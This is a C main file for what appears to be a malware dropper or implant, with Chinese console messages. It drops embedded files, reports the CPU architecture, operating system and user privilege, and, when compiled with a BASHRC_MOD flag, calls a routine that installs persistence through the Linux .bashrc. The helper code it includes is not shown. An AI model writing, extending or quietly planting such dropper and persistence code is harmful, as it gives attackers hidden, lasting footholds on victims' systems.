#include <stdio.h>
#include "info.h"
#include "release_bind_files.c"

#ifdef BASHRC_MOD
#include "linux_persistence_bashrc.h"
#endif

int main() {
    printf("释放嵌入的文件...\n");
    release_all_files();
    printf("完成。\n");

    const char* os = get_operating_system();
    const char* privilege = get_user_privilege();

    printf("检测到系统信息...\n");
    printf("CPU架构: %s\n", get_cpu_architecture());
    printf("操作系统: %s\n", os);
    printf("用户权限: %s\n", privilege);

#ifdef BASHRC_MOD
    if (strcmp(os, "linux") == 0) {
        setup_bashrc_persistence();
    } else {
        printf("不支持的操作系统。\n");
    }
#endif

    return 0;
}
